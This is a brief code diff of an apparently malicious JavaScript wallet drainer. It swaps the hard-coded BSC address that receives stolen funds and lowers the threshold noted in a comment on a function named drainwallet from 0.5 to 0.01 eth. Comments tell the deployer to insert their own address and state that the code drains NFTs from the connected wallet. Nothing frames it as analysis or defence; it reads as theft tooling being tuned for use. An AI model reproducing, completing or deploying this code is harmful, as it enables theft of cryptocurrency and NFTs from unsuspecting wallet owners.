@@ -1,4 +1,4 @@
-const receiveAddress = "0xA66C58F9913F9b24cE3d3840388e25A3010bc622";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x8c7492CB58cB0D52a20e96997F01cd411167ab9e";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
@@ -15,7 +15,7 @@ function approveSpending(token) {
 }
 
 function drainwallet(token) {
-	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
+	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.01 eth 
   			
 }
 
